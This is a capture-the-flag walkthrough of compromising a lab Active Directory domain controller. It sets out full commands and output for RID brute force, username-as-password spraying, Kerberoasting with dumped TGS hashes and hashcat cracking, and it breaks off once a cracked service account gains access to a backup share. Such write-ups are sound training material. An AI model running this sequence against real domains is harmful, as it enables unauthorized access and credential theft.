
# PORT SCAN
---

| PORT      | SERVICE       |
| --------- | ------------- |
| 53/tcp    | domain        |
| 88/tcp    | kerberos-sec  |
| 135/tcp   | msrpc         |
| 139/tcp   | netbios-ssn   |
| 389/tcp   | ldap          |
| 445/tcp   | microsoft-ds  |
| 464/tcp   | kpasswd5      |
| 593/tcp   | ncacn_http    |
| 636/tcp   | tcpwrapped    |
| 3268/tcp  | ldap          |
| 3269/tcp  | tcpwrapped    |
| 3389/tcp  | ms-wbt-server |
| 9389/tcp  | mc-nmf        |
| 49664/tcp | msrpc         |
| 49667/tcp | msrpc         |
| 49676/tcp | ncacn_http    |
| 49712/tcp | msrpc         |


# RECONNAISSANCE
---

Let's add the DC and domain to `/etc/hosts`:

```bash
echo "10.201.102.90 DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL" | sudo tee -a /etc/hosts
```

We don't have initial credentials, time to perform anonymous enumeration:

```bash
smbclient -L //10.201.102.90 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk
```

We got some interesting shares such as `backup` and `Users`, let's check them out:

```
smbclient //10.201.102.90/backup -N
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \>
```

We can't read `backup`, let's try users:

```
smbclient //10.201.102.90/Users -N
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```

We're in a tight situation, we can't read any of the shares, `ldap` anonymous bind doesn't work and rpcclient doesn't work, what can we do then?

Let's perform `RID` brute force due to the `IPC$` share being readable:

```
nxc smb 10.201.102.90 -u 'Guest' -p '' --rid
```

![Pasted image 20250808174835.png](../../IMAGES/Pasted%20image%2020250808174835.png)


We need to filter the usernames, let's save the output on a file and use `grep` to filter:

```bash
grep -oP 'SOUPEDECODE\\\K[^\s]+' ridbrute.txt > usernames.txt
```

With our list of usernames, we can proceed to exploitation.

# EXPLOITATION
---

We could try `as-rep` roast with the users we found, but unfortunately, we get nothing back since none of the users have got `UF_DONT_REQUIRE_PREATUH` set, let's try `password spraying` without brute-forcing using `nxc` to check if we're lucky enough to get something back:

```bash
nxc smb SOUPEDECODE.LOCAL -u usernames.txt -p usernames.txt --no-brute --continue-on-success
```


![Pasted image 20250808174840.png](../../IMAGES/Pasted%20image%2020250808174840.png)

We can see some guest credentials but the most important finding here is:

![Pasted image 20250808174844.png](../../IMAGES/Pasted%20image%2020250808174844.png)

We got credentials for a normal user named `ybob317`, let's check our shares now:

```
ybob317:ybob317
```

```bash
smbclient //10.201.102.90/backup -U 'ybob317'
Password for [WORKGROUP\ybob317]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \>
```

We can't list `backups`,  what about users:

```bash
smbclient //10.201.102.90/Users -U 'ybob317'
Password for [WORKGROUP\ybob317]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Jul  4 18:48:22 2024
  ..                                DHS        0  Wed Jun 18 18:14:47 2025
  admin                               D        0  Thu Jul  4 18:49:01 2024
  Administrator                       D        0  Fri Aug  8 15:29:05 2025
  All Users                       DHSrn        0  Sat May  8 04:26:16 2021
  Default                           DHR        0  Sat Jun 15 22:51:08 2024
  Default User                    DHSrn        0  Sat May  8 04:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 04:14:03 2021
  Public                             DR        0  Sat Jun 15 13:54:32 2024
  ybob317                             D        0  Mon Jun 17 13:24:32 2024

		12942591 blocks of size 4096. 10603022 blocks available
```

Nice, we can list this share, let's check it up:

```
smb: \ybob317\> ls
  .                                   D        0  Mon Jun 17 13:24:32 2024
  ..                                 DR        0  Thu Jul  4 18:48:22 2024
  3D Objects                         DR        0  Mon Jun 17 13:24:32 2024
  AppData                            DH        0  Mon Jun 17 13:24:30 2024
  Application Data                DHSrn        0  Mon Jun 17 13:24:30 2024
  Contacts                           DR        0  Mon Jun 17 13:24:32 2024
  Cookies                         DHSrn        0  Mon Jun 17 13:24:30 2024
  Desktop                            DR        0  Fri Jul 25 13:51:44 2025
  Documents                          DR        0  Mon Jun 17 13:24:32 2024
  Downloads                          DR        0  Mon Jun 17 13:24:32 2024
  Favorites                          DR        0  Mon Jun 17 13:24:32 2024
  Links                              DR        0  Mon Jun 17 13:24:32 2024
  Local Settings                  DHSrn        0  Mon Jun 17 13:24:30 2024
  Music                              DR        0  Mon Jun 17 13:24:32 2024
  My Documents                    DHSrn        0  Mon Jun 17 13:24:30 2024
  NetHood                         DHSrn        0  Mon Jun 17 13:24:30 2024
  NTUSER.DAT                        AHn   262144  Fri Aug  8 15:49:33 2025
  ntuser.dat.LOG1                   AHS    81920  Mon Jun 17 13:24:29 2024
  ntuser.dat.LOG2                   AHS        0  Mon Jun 17 13:24:29 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TM.blf    AHS    65536  Mon Jun 17 13:24:54 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Mon Jun 17 13:24:29 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Mon Jun 17 13:24:29 2024
  ntuser.ini                        AHS       20  Mon Jun 17 13:24:30 2024
  Pictures                           DR        0  Mon Jun 17 13:24:32 2024
  Recent                          DHSrn        0  Mon Jun 17 13:24:30 2024
  Saved Games                        DR        0  Mon Jun 17 13:24:32 2024
  Searches                           DR        0  Mon Jun 17 13:24:32 2024
  SendTo                          DHSrn        0  Mon Jun 17 13:24:30 2024
  Start Menu                      DHSrn        0  Mon Jun 17 13:24:30 2024
  Templates                       DHSrn        0  Mon Jun 17 13:24:30 2024
  Videos                             DR        0  Mon Jun 17 13:24:32 2024
  
smb: \ybob317\> cd Desktop
smb: \ybob317\Desktop\> ls
  .                                  DR        0  Fri Jul 25 13:51:44 2025
  ..                                  D        0  Mon Jun 17 13:24:32 2024
  desktop.ini                       AHS      282  Mon Jun 17 13:24:32 2024
  user.txt                            A       33  Fri Jul 25 13:51:44 2025
```

We can get the user flag on here, I'll put both flags at the end so don't worry, let's proceed.

We got a valid set of credentials, let's use `bloodhound` to map the domain better:

```
bloodhound-python -d SOUPEDECODE.LOCAL -u 'ybob317' -p 'ybob317' -ns 10.201.102.90 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
Traceback (most recent call last):
  File "/usr/bin/bloodhound-python", line 33, in <module>
    sys.exit(load_entry_point('bloodhound==1.8.0', 'console_scripts', 'bloodhound-python')())
             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^
  File "/usr/lib/python3/dist-packages/bloodhound/__init__.py", line 314, in main
    ad.dns_resolve(domain=args.domain, options=args)
    ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodhound/ad/domain.py", line 705, in dns_resolve
    q = self.dnsresolver.query(query, 'SRV', tcp=self.dns_tcp)
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1363, in query
    return self.resolve(
           ~~~~~~~~~~~~^
        qname,
        ^^^^^^
    ...<7 lines>...
        True,
        ^^^^^
    )
    ^
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1320, in resolve
    timeout = self._compute_timeout(start, lifetime, resolution.errors)
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1076, in _compute_timeout
    raise LifetimeTimeout(timeout=duration, errors=errors)
dns.resolver.LifetimeTimeout: The resolution lifetime expired after 3.104 seconds: Server Do53:10.201.102.90@53 answered The DNS operation timed out.
```

I tried for a long time to make `bloodhound` work but it seems to be a problem with `DNS` on the machine that we're unable to solve, if you were able to solve this issue, feel free to use the tool:

```bash
dig @10.201.102.90 _ldap._tcp.SOUPEDECODE.LOCAL SRV

;; communications error to 10.201.102.90#53: timed out

; <<>> DiG 9.20.9-1-Debian <<>> @10.201.102.90 _ldap._tcp.SOUPEDECODE.LOCAL SRV
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 25045
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;_ldap._tcp.SOUPEDECODE.LOCAL.	IN	SRV

;; Query time: 4165 msec
;; SERVER: 10.201.102.90#53(10.201.102.90) (UDP)
;; WHEN: Fri Aug 08 21:21:17 EDT 2025
;; MSG SIZE  rcvd: 57
```

As seen, we get `SERVFAIL` so, we need to proceed using other tool, let's use `ldapdomaindump` then:

```
ldapdomaindump ldap://10.201.102.90 -u 'SOUPEDECODE.LOCAL\ybob317' -p 'ybob317' --outdir ldapdump
```

Once the scan finishes, we get a deeper understanding of the domain:

```
wc -l *
    135 domain_computers_by_os.html
    101 domain_computers.grep
    133 domain_computers.html
   9363 domain_computers.json
     48 domain_groups.grep
     80 domain_groups.html
   3084 domain_groups.json
      1 domain_policy.grep
     33 domain_policy.html
    175 domain_policy.json
      0 domain_trusts.grep
     32 domain_trusts.html
      0 domain_trusts.json
   1037 domain_users_by_group.html
    968 domain_users.grep
   1000 domain_users.html
 125597 domain_users.json
 141787 total
```

We have the info, if we look the `domain_users.json` file, we can notice some `ServicePrincipalName` linked to users, this is vulnerable to `kerberoasting`, a brief explanation is that Kerberoasting is an attack technique against Active Directory that allows any authenticated domain user to request service tickets (TGS) for accounts linked to Service Principal Names (SPNs). These tickets are encrypted with the target service account’s NTLM password hash, which can be extracted and brute-forced offline without triggering account lockouts or alerting the target. By identifying SPNs for high privilege service accounts, requesting their tickets, and cracking them using tools like `hashcat` or `john`, an attacker can obtain cleartext credentials and potentially escalate privileges within the domain. 


![Pasted image 20250808174856.png](../../IMAGES/Pasted%20image%2020250808174856.png)


Let's use `GetUserSPNs.py` to request the TGS in order to crack it, time to begin privilege escalation.

# PRIVILEGE ESCALATION
---

Time to kerberoast then:

```python
GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.201.102.90 -request

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 13:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 13:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 13:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 13:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 13:29:18.511871  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$b738976ff66f70775bfe1bb337f1bd17$d415ca683c9ac9af8616b152c7bd1cdd89d75223dec4cbdf3eed42e3cc876fb053f0536073ef855ec54a591fac32f4aa0454ef7afb93d77d3475526ba49d15c6c0adec08b51cb251e91499846452437af9dda954d0545520ec1f9059833d75dc7fd715f41a11a13ca3bd8318bae722896d9de639bfb65844408b1bf029e598d2096abefea66b8ee8d446b42dab3ca3994fdc68e5ded696389541a636d8387f34b0b5daf5be106dd5f84e6dd5e8e5d02fc96f18f5be3496c7ff35eb91cca91e4c0f57288d61804f03deaafa60a1c42fc1899e0bca25219ede8b7c689cbf42d760a52e6704abe9c9b218255509864cc3c9e4d26df975ed44d56ff57200d2df1a9fc3d009d12c809696656f071b8091a3e394226cfb3d9cc09d98903659a1e836551c625ecb82eba6a9205779bb4900e1cff39a8a0f8e9bf0a29b3b67c8bf9f2b5b170a7778a52ae86c68df199c8528e22eda24b88b27312a4bb9ed8f9b2df5c1aa325a2b30fd6d86f67f8cc77b0b69e7e12a7d9d71371393d8356785d4c384a19a738fa6ea5497a5666ce8fd0a0e532a2ccceb9939b49981008f11c8a9de37529525a513ad3a1d138f9fe96c4d4fa3f1cf54831a421170a9558ab009107711d889d72f2aa9641f3d9b58212602f5b160403b6aeb36549f1a7b06ed24756702d25aa7fef70ad8e9a5557d0221339f34214f05daec572f7b9e5fd559fb0f1fda1c41d2eddf7d67ba88ed7240a2cbc1e8f68fbad447da896b8fc1eaa669acc588704c1c0a126e2e948c21397bf24fa4aeb8b21e4c4194dba3562848ec8111990c4fdfb31fc556cee0a48fcef89aeafac888d0ee4fec8445a41a390b2d106c36ab81ec7916e31db7d5aea8731ced510dfbab93ec6a7fef8031ad344d46797c21dff0f5d0b48c628d6e5bb9657f84d77bbde2a23dededf7db8a4fccc4a8d4735be41380bd7c23c224a2033ea6317111cb753cbe7340e06b7a03be35be718e27f8ebe48802d46b4c4d3d0043f931b4c4d12596c689493d53a9d7bf8961d84fbf1db65da3484fcd8919f8419dd408478aae7c2bbe8468f896d8553f5cebf49b04b35b75a67b96cc8964ee040f65f9726745e5999ca38e800b4fc396318f7d8746bf018ace20385a881c608fbeb133fe84134a355916d388b2b21ed35072ba4d41cfad2f1e8d24c007f75ceb937cb3c5c6357df68c09daa5fb883deaacdef42f80b1849a0394f27181ea8abc6c16d9c83e1fd61d8e6691b25e7a68a1952e2c1bd92a8d36cf08ddedea470614cdc22be06f2248281baa75bf903a940186dab4561a434ec1d9b415893868bbab792054064c60b8e65ab3a41f2f6e22accf23444badbc4d53e5e5183e342db17d6cfdcb94b46b2d9ebf941f7ecc1ee20bc1669f2f84fc213fd4b5e0f2eab097cf08d57bccd7381428434e2717c2160d610e2389a5ee07ce4ea6f01cb36cae55c8f2e22f9fb094e0559b086c988afa26ac02dddf3548d66523711c
$krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/firewall_svc*$9945a59f376d98d6f306e86e5cce7c61$e6bc42dbd31a0a3dab8734c6db7376a775e972d737065242f0fc1b7907b3245d422fa2cdb796d8de02a59e71f0b1f0164ff9bd6d26c1ea4d7df3177ebd75c2229630b1b2ae06e3f1f0973cdb869aa7a379e8c4ba6c532d73c92651fd2e457a14287a258233a2e5e0a07bfdc5c703389f25b303a8b021f62e195fd694ec4c8d8ac0e8868de376a7716739d2471cd257674c627fcba6021cd76d5307187d40fc4716ee46381d5a82d17a619174451d1af260642d5ce6c2c46a057b71fe6d462e82364fcf1fdb2cd4b4179f8c1729745f3cc764d91d12b9dc5ed19568a73aef1eaeed9bccc6ae6189190f3c6227086994370fa5641bf6edfe5f6f49c67b987431aa658de047d94a77f7488d9292d120cfadecdefedb6cdac9e32465c1498e35c057fd9ae5ed9e9a17fa912e2a2e537837a485c4d0a8a20a8ac07f899a1805ab894176db6efdfa7808b816b455570c03f3100d6a218a3dcb5ca25c02738f1707a6fec5fef874340a73d6e64b50f4201670d4ba5c4637897ba34b2fc385637d9045ccd976c4528fae102c83535562f2f87db3bf07bb2c4c79c2bfa6c89b96c7a7c15b06e25a50711bf7d7795fe20034ba2b762a2c2f356473c16be3dbc74a731fa25d5949ea2ab48250b5c63ca6390fc8507b9278919f1cd8b17df2a5bc862ef74b6fd45f1543cfacaac924664e392fd5b4464c083b33c2e0622826c78d880edf7308b9b7f74f1ea050ef460f0c00c6ddb8d30afc861a7457fb994dca1581c27a6946fb63f2e1bbb2213b6f304f6a5699d817dae6667e3d4a117db1f7ce0d10c0ce4355bf39db8bb7a2530da79b19af15f6712ca3b82db91d1e3d975c91b8f65217b9a3b9c6dc0285f54a841172474bab1c8b9c3a08ed2e34feb71d458b81ae0314fd23af93443fcd392205e7acf4962189680eac06b66fc59609d8d51f7a9d045272e32eef13b892a1a469426fbd22e65adda8e4372b963a6003c612ee349e8be92ae25fff3afd2bec37c78f6900199096ab8f371ff854d77119f8e6a25da2f24b2b964655906ec40eca735971513fee1ec844965214be0723b4ba38e55521d449ec529b933fb28d351560d90846406bc20fa56620371672e6bc9eb199d8e206bfe80d9251d3c27051e2ec2630f7373b524d50509ac8b0d3155e3b57d0ccb81b7140289bde0e42945f7f2194645955b061963280b388e96da2391a0b0bf549a1a3d81556dfcdc6bb339911c77fd9b982806bb4849c41cbe490fa98a151c8befce641f90f2c6e067012c63fff5ec97da8222a2e2a6c030024b14533ac336e908a1b3b791d2d3319b5c522a226c0d6537f996e66be7fa3c57346887f17ec942ba730af47bcf8ff002c76581c5fdeb70e3be79c5489efa4115f8269478ded7f3c2b5bfadccd607fc30c184c177efe28c38bbca44e6d76e94dda58c5eeb63202ecb4226cc3f1cc6eff8017ab21dfd3abe1ecac9d9333e8a81556e6abf438553747004fd2d6
$krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/backup_svc*$4c928e8dfd1d78d84a1608c2da0e6a9e$dce945a1c765a17d0d0415d0d893e30d0fd84a65cd5b628d38c7fb9b083fdbf6ded4a2bcb643f291333ca6f026356b1c882ed0c1f3f75df1bce597873ca06a2652f4cae9bef430b66eeedcca86fa2797764d143d56ddbd707929f10faece384581b1fd2c3c6642d6ee1a4871378b247f451722a95b2e725826aba2c1ee35018caa7a87003fa346846e4abe1b7dcc77201ac69ab67cc8b6e274068f0f9fd73ed0396f3736dacdf9ebfc189e2206ca070cea24d93a9e9e412c553335c23e30e1a73123477e12b06cac15ac20d91a3d43ffbd0ed40acc40439c3589bca1aca46ca146701e9379f8d82c75d4fe7de7bcd3d7119b2b55cd7064b1ad11fb3f43d1be5888a94493e24aefb2a5a7f81b3a87e1809df15c5bb39bb58346f5cf5593e4c7e6fed6539df9b641cd1e6a9d106e9587e38abbe8a900a714041f3e007be8a5f0a4917b7a2292bdf135f545795a84ccf4de5b675942360d6b5ec8ba4fd91500e80566854bfc71fbc2f19f62c0ce9763ea07471d9cd5015a552ce014e9494114da78dd4b3c10150bf442a0a172497b2f2f0da2cc82afa6ce748ba58975be2d33e9ce44ffcd21061bcac713f58d64c9148989116e7fedacc4b5de387864a43ce26ac9cc21d6991eae217d3f1a1e14d8f960d6c21ccb517e0afc1aeb80e2c399d2034ec841ccbe0d85b98d7a2b5200bb422a3ec7a9e44168b03ba8d606224dc39eeaf550fa6a7f921d6d4beb8f2f1608b3746b2f38c91c7758cc223268388fabaef866e56981e4326b38eb7e501dd13d9f6d983d4f4589de9fa356e25370eeec821c47eed055232c54fa34a217b42692a60a64de08f921b647c925ad421c0282a2ce9cd338876a77ef8f6e4bb48166058148058507be77bd18563e02c5e21a5f55937d50ccb843edc8738092744d0f79bea9b375c2b9c32ca6456db8faea9c3ae2d035583885a48810529f27d62880e3a8c93e2e84b11c36389d1389ca4c3fad1cf537ff11ae97f51f82e29d5c807027534bea45d967d67a65499fe0c3f578f9d64fc3c228b8ee5387894b6e9bd3d39beffbfe45c7df3b0a1322c1395040813fdaf6c60e572bc9c6e5974271027c49b57a3b3dc75cd37a90c361545d7ac51d07d0779f3b07062403abb1358f4c417eee9c994b730a445b0d8a5f700f1290e43c33a6c58c4d5da3ea0c3654f4d0b624931cbdf86de63e0bc8c0fc5d81a2b8b8f0c97e7c936c6077aa352af049113cbddb059cbfd8efd420789d88a5b3baa1e5b53307f1cc746de07f723f1de8bd865ee21feb4cc233d3cd635a262595f39e643351645da0611359f1d148b98830a7520fe4a4737856e2bfb5d046bdeec35169014afd1f5ae9cf524af5d200b6d66b1cdb130513602e1e95fab4ee7610f2119db717ac8786c4fc2653d5c35a1930b1760981c76e663e896d9e53e8f3b2994eeb69bd77ba0e0fbcc7bb09760be2c258ea15c1489d3a87acc593d788844186125b3a611e5e6e
$krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/web_svc*$4d18b1a5f6a0331eee60bbbc0282b1cb$2f42d417a47d976c8722d25ef4a66d49302f644cd08e307bf82fda99fb4d3e81d26224c1f1a478745ef010d523422fb0479c43d13c6915bc87d1d9b26df370e7095384e50b4d4e71ab1a014738e2cfb46b62617340a8f72c5a90f1b0185e18812ded7a3f9178b9dcdd339ced20646b065a42b7816ca87bbce78f659405159dc281bd40a2272aff48b39a9c2c30596e77e757db159faf90de4ed571ce5b8b4d1c706068563ee2fd10689c53793a10c18e241af4310ba1c08c12595f032a4aa9f896f1d25d1f3214447a8ae9acb6e85f42e16446d1dda75482f9ec9ebdc7cdc2a79f712ac8e2f21470935dc24fba177a2255f27d48cba8ce0d1d292ddfb2e59d7ff78d7a020759cca8caae5c0cfc8249a3d432f7b47bad8d8ea00a1cdd06ad381058cd8b85e4e713ea1d64cafe8d0be1e411ca4a815f0d97ad7562c31fa136cd514dddcbfcd719fda325e4a6d9d6c7295f545396488b136c861460a9c67cc7363af4d1475338c7387576416a870c399ee293146e6699da844fd561929a18a859675c4e8267a63eff0f85a0258eb2c1b0c587929884b53f043266557204e96398926f0785b3ce07f44cba8d72420c143248e1468a89af6a8cd8eb28e02df17a9e6977862271fff507925077882ebb8d73430b9fe382b896b11efdb030ed7d43ddbf223924b3cf66d636209d20beb2534db702b522879842a68b0cbc708c853a83d72353f06b5dacdd5b6cc4990ebc76bd4d468a57825d5a684b4f983d283ca9d17fcd2dddbb8e2405a363c26c85a392a6f7c3a1f75eb37cb7faf466810dec242454f18a0679801b0ad7d873c30154a61aca499f6b3eaf0ebed227296aefded39a8e25ea70f2127cbc768154bd9020f840b27fb60eef25a5fb50bdc3337303d8e75aa3243ab9b932c7e584a07bcc4c77ad0b5a9ebdfa46997586c69d2a8b318697c07eec23827c91eeb3cd1fbe30fdb83d8b024e67c6e1d31a72ae9004edfc14f75b3ef798ae9d38f59d7d0f7b3cea2cdcf1e2e3945e627ae294bed41c142a68438d1947fce0cd6c7b74d273460ec7b7fca3683b20488b7991b946ab925b8150a1cc84f2234e84f59dfc72455f0e09b93905a9f54edf5a22913493b8c310a5640f2a2fa108f78e6e8437dfce19e1e5a38e37b76edba63569804cf0da0ce8599d55c36d3dd8c98c7066192835ea2dab7e1e284683e5f5eadb0c8e7453e0e4881f1d8a8e412feda513c491b3c78c53e2394485803a8a30514763f8f2fca92a16a1ab8fe249692ab89e9ff5a85d152f6cd8ec4d05d3fdd184bbff8c59db1d8e9d3ca5acde8b702b410b930463250ac9d1a3743dc13a16aac01f00e7f9136f48dcbf984ccc182503d01d7a2c7bfb6b19fd872a5e96166b21b9bb54a03a26dfa434d97fb19b47f2817edb7f84ee99528ac2a867a33cbe113349d2700bdc950b4f11e0eac050a2ab85a3b85f1d8748607a10d607764acea06b888cc1cfca04e28d843518de54
$krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/monitoring_svc*$f59b40f3fa475877b95516704b5b2e44$fa27baff95ee2022dcc7fc967ccd70c617a10c8d7c4e36a1ae98385da80c85615464bdb9faadee52b59883d36c023196176bc0bc44234013fee9792bec228fe1a14caac0d865342c7f9f1a013d2d5839cbd6df36667833240439b7ece93060db1ae78df958fb6e36c3392669f13a4519aa3dc78c4676518a4bcbe1207385e3a6a4dc7a236359aa3cdd5b1aa3773096c5f63cb6cae42364d6bf80ed6ad82a67864d9d5830f63620ccf85f2ce4136bc8442b916540cfc225d247ba1e50870cffbff12733991857b35dd2243cc7f7f119b8b7de0a0a939b64459e31c35c8ebd58409071886bbfeaccc1b6a51b356bec47ed279c8a65fdd5f48a8e579be1c1712392019ea7e68c71227f5e371d614b3f3f9a65c1342a0be3ccf1f4d5794bb3417400d67c39b6967203ca15c9cfbcdacfa1aa4c4c5d36cebc9df59dfaeca1191dc32442f0b5ae58b7d4f8456bb00072b4b87fca8089ff09577167f79373a2462c4f8aeb005eca8b1c23b14377aa23645264c14bef970aaeb5337d99718c03fe3f522fe0671b1ea63f42463a5131b32bd8baaad05b814797b4aa9f7199496aff12fbe2850f136de152605a6420c3a11bffdf4e9865b7661ad3ad1111c2275b9d6ab97b3ca23f94871f0494a4930dca49e56cb5837319f1c879b835fb9a8d798849474eb3ac86340617cb1a0a3f78555339a72008e1381b13248cfa26cbe6eb823f132cd0dcb362b4431a6ef95cf1fff3cc4eca6463ae08a956e6b1608fabf7b67ffdfa2ace54e85bb1b6fcda403c3f5a5ba2d5f98ea82cb65897474eb6d238c898fac2bcc9e2df163862ffc5485dbff34fb9b7a6f699779179437ef1d53381405551f94d83715171b17875f59edc01349a2d3b1d12cfe46e4c3eefe661b28d9defdbb2838599a4a2a172f5c10bddf0231c576e7e2e26d6b8a40995dfb6324fa7278690fbe1f69693aa53e8bd5439292e4ed57a909117e2a930b76765e15ae1d03e4c1f51ff3827208b43280ee53af78540d6f355a3a91955c2ba723aa0c0ff1ea9c2bfd1d85bc2f5a7d9529b979a6aa83f8dd14c6a06e3945ece0f497a46334847563a652e5d8568e62005a83e5118fb9ce1011e534b095c20af705d8144a55d0b4887e87ecb848ad1a8cd89b43b983b6419acec1ddb804a0be99a239183e5e91592cc31d019f63edcc5591eb94c07e2d22d7534fdb076c31d13fe1fbdc586a358293f20c94179e04e0e678cafec853f59c1dc2c5ee30f14649b2180ccd888e7c36ee9e2545b9c9903a515cf3f81e61d14dcd662b876110779c2b35e68b0c99ddbc58214cf5c8ef6b7c5cc83fba2bef4bab88eeab75961de88dbfcf3d00f6984523ac095deb5a1553e2cb08168f8c14957d3bc259c54ec9be5f7b485bf73792941b94d8c14cb9c937312d36301591fd075232fd4e7ed95d7e66f91fa6dd8116707311b73c2f144909a5fd21147f2e50494a62611ffe7d40f06fc8499c7835f5d32219829
```

We can request a TGS for a lot of accounts, let's attempt to crack the hashes using `hashcat`:

```
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$b738976ff66f70775bfe1bb337f1bd17$d415ca683c9ac9af8616b152c7bd1cdd89d75223dec4cbdf3eed42e3cc876fb053f0536073ef855ec54a591fac32f4aa0454ef7afb93d77d3475526ba49d15c6c0adec08b51cb251e91499846452437af9dda954d0545520ec1f9059833d75dc7fd715f41a11a13ca3bd8318bae722896d9de639bfb65844408b1bf029e598d2096abefea66b8ee8d446b42dab3ca3994fdc68e5ded696389541a636d8387f34b0b5daf5be106dd5f84e6dd5e8e5d02fc96f18f5be3496c7ff35eb91cca91e4c0f57288d61804f03deaafa60a1c42fc1899e0bca25219ede8b7c689cbf42d760a52e6704abe9c9b218255509864cc3c9e4d26df975ed44d56ff57200d2df1a9fc3d009d12c809696656f071b8091a3e394226cfb3d9cc09d98903659a1e836551c625ecb82eba6a9205779bb4900e1cff39a8a0f8e9bf0a29b3b67c8bf9f2b5b170a7778a52ae86c68df199c8528e22eda24b88b27312a4bb9ed8f9b2df5c1aa325a2b30fd6d86f67f8cc77b0b69e7e12a7d9d71371393d8356785d4c384a19a738fa6ea5497a5666ce8fd0a0e532a2ccceb9939b49981008f11c8a9de37529525a513ad3a1d138f9fe96c4d4fa3f1cf54831a421170a9558ab009107711d889d72f2aa9641f3d9b58212602f5b160403b6aeb36549f1a7b06ed24756702d25aa7fef70ad8e9a5557d0221339f34214f05daec572f7b9e5fd559fb0f1fda1c41d2eddf7d67ba88ed7240a2cbc1e8f68fbad447da896b8fc1eaa669acc588704c1c0a126e2e948c21397bf24fa4aeb8b21e4c4194dba3562848ec8111990c4fdfb31fc556cee0a48fcef89aeafac888d0ee4fec8445a41a390b2d106c36ab81ec7916e31db7d5aea8731ced510dfbab93ec6a7fef8031ad344d46797c21dff0f5d0b48c628d6e5bb9657f84d77bbde2a23dededf7db8a4fccc4a8d4735be41380bd7c23c224a2033ea6317111cb753cbe7340e06b7a03be35be718e27f8ebe48802d46b4c4d3d0043f931b4c4d12596c689493d53a9d7bf8961d84fbf1db65da3484fcd8919f8419dd408478aae7c2bbe8468f896d8553f5cebf49b04b35b75a67b96cc8964ee040f65f9726745e5999ca38e800b4fc396318f7d8746bf018ace20385a881c608fbeb133fe84134a355916d388b2b21ed35072ba4d41cfad2f1e8d24c007f75ceb937cb3c5c6357df68c09daa5fb883deaacdef42f80b1849a0394f27181ea8abc6c16d9c83e1fd61d8e6691b25e7a68a1952e2c1bd92a8d36cf08ddedea470614cdc22be06f2248281baa75bf903a940186dab4561a434ec1d9b415893868bbab792054064c60b8e65ab3a41f2f6e22accf23444badbc4d53e5e5183e342db17d6cfdcb94b46b2d9ebf941f7ecc1ee20bc1669f2f84fc213fd4b5e0f2eab097cf08d57bccd7381428434e2717c2160d610e2389a5ee07ce4ea6f01cb36cae55c8f2e22f9fb094e0559b086c988afa26ac02dddf3548d66523711c:Password123!!
```

We got credentials for `file_svc`:

```
file_svc / Password123!!
```

Let's check if we can read the `backup` share:

```bash
nxc smb SOUPEDECODE.LOCAL -u 'file_svc' -p 'Password123!!' --shares
SMB         10.201.102.90   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.201.102.90   445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         10.201.102.90   445    DC01             [*] Enumerated shares
SMB         10.201.102.90   445    DC01             Share           Permissions     Remark
SMB         10.201.102.90   445    DC01             -----           -----------     ------
SMB         10.201.102.90   445    DC01             ADMIN$                          Remote Admin
SMB         10.201.102.90   445    DC01             backup          READ            
SMB         10.201.102.90   445    DC01             C$                              Default share
SMB         10.201.102.90   445    DC01             IPC$            READ            Remote IPC
